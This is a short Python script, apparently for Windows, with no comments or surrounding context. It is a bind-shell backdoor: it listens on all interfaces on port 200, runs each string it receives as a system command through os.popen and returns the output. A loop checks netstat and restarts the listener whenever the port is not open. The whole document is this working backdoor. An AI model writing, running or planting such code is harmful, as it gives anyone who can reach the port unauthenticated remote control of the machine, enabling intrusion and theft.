import socket
import os

def listen():
    s=socket.socket()
    s.bind(("0.0.0.0",200))
    s.listen(10)
    a,b=s.accept()
    while True:
        comm=a.recv(2048)
        comm=os.popen(comm).read()
        a.send(comm)

while True:
    lan=os.popen('netstat -ano | findstr 200').read()
    if "0.0.0.0:200" in lan:
        continue
    else:
        listen()